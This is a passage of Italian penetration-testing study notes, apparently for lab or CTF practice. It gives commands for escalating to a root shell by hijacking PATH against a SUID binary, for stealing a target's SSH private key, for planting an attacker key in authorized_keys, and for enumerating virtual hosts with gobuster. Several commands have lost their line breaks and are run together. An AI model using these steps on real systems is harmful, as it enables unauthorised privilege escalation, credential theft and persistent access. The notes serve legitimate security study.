...
`./pspy64`
###### Path hijacking
Path Hijacking sfrutta il fatto che, quando un programma esegue un comando senza percorso assoluto, ad esempio `cat` invece di `/bin/cat`, Linux cerca quel comando nelle directory indicate dalla variabile `$PATH`, da sinistra verso destra.Se un binario SUID esegue `cat` senza specificare `/bin/cat`, posso creare un falso `cat` in una directory che controllo, ad esempio `/tmp`, e poi mettere `/tmp` all’inizio del PATH:

`bashexport PATH=/tmp:$PATH`
Creo quindi il falso comando:

`echo '#!/bin/bash' > /tmp/catecho '/bin/bash -p' >> /tmp/catchmod +x /tmp/cat`

Quando lancio il binario vulnerabile:
`/usr/bin/sys-monitor`

il programma cerca `cat` nel `$PATH` e trova prima `/tmp/cat`, eseguendo il mio script invece del vero `/bin/cat`.

L’opzione:
`/bin/bash -p`

serve a mantenere i privilegi effettivi ottenuti tramite SUID. In questo modo posso ottenere una shell con i privilegi del proprietario del binario vulnerabile.
###### Aggiungere un utente in etc passwd
...
###### SSH PARENTESI
- prendi la chiave privata del server da attaccare
- leggere chiave ssh `homeutente/.ssh/id_rsa`
	- chmod 600 per il file per eseguirlo
- poi fai
	- `ssh -i <chiave_ssh> user@<ip oppure hostname>`

- carichi la tua chiave pubblica nel server da attaccare prendendola da
	- `/home/kali/.ssh/id_ed25519.pub`
	- mettila dentro `/home/casdoor/.ssh/authorized_keys`
	- poi fai `ssh -i /home/kali/.ssh/id_ed25519 casdoor@192.168.14.16`
##### Network
...
- trovare i virtual host che nascondono gli host che hanno 4829 linee
	...
	- `gobuster vhost --ad -u http://orbetellobiblio.vdsi -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt`
		- `--ad` effettua forzatura di append domain mettendo `parola.dominio`
